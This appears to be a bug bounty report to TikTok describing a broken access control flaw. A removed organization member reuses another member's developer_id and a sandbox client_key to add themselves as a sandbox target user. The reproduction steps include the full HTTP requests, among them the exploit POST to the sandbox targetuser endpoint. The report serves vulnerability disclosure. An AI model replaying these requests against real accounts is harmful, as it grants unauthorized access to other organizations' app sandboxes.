**Program:** Tiktok

**Title:** Removed Organization Member Can Add Themselves as App Sandbox Target User via GraphQL Using developer_id and sandbox_client_key
## Description:

A removed organization member can add themselves as a sandbox target user of an organization app by sending a direct GraphQL request using a previously known developer_id (of an active org member) and the sandbox’s client_key.

The endpoint validates the provided developer_id instead of verifying whether the authenticated user (from session cookie) is still a member of the organization.

This results in broken access control, allowing a previously removed member to add themselves as target user.

## Steps to Reproduce

1. Create an organization on TikTok Developers
2. Add a team member to the organization as an admin
3. Creat an organization based app
<img width="959" height="449" alt="Screenshot 2026-02-24 101213" src="https://github.com/user-attachments/assets/6285cc80-e2a5-42ed-a9d3-1afd01276d93" />


4. Create a sandbox version for the app
<img width="959" height="449" alt="Screenshot 2026-02-24 101301" src="https://github.com/user-attachments/assets/f449166c-20fd-474a-b39e-f89637c954f1" />

5. As the added member, capture:

- The sandbox app client_key

- any member or owner of the organization's developer_id (which would be the first user on the list) by sending the graph ql request below:
```
GET /tiktok/v1/identity/organization/member/list?org_id="ORG_ID" HTTP/2
Host: developers.tiktok.com
Cookie: [redacted]
Sec-Ch-Ua-Platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Sec-Ch-Ua: "Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"
Sec-Ch-Ua-Mobile: ?0
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://developers.tiktok.com/portal/organization/7603220577582580747?tab=members
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=1, i
```
6. As org admin Remove the added member from the organization.

7.Log in as the removed member.

8. Now as the removed member Send the following request:
```
POST /tiktok/v2/oauth/sandbox/targetuser/add/ HTTP/2
Host: www.tiktok.com
Cookie: [valid session of removed member]
Content-Length: 72
Sec-Ch-Ua-Platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Sec-Ch-Ua: "Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Origin: https://www.tiktok.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.tiktok.com/tiktok/v2/oauth/sandbox/targetuser/add
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=1, i

{"client_key":"SANDBOX_CLIENT_KEY","developer_id":"ORG_OWNER_DEVELOPER_ID"}
```
9. Observe that The removed member has successfully added themselve as a sandbox target user.

## Actual Behavior

The endpoint authorizes the request based on the provided developer_id, without verifying whether the authenticated user making the request is still a member of the organization.

This allows removed members to regain sandbox configuration access.
## Impact:
A removed organization member can still add themselve as target users to an org app sandbox, allowing unauthorized access to an sandbox configuration 
  
**weakness**: Improper access control

**severity calculation**: AC: Low - PR: low - confidentiality: low - integrity: low - Scope: Unchanged
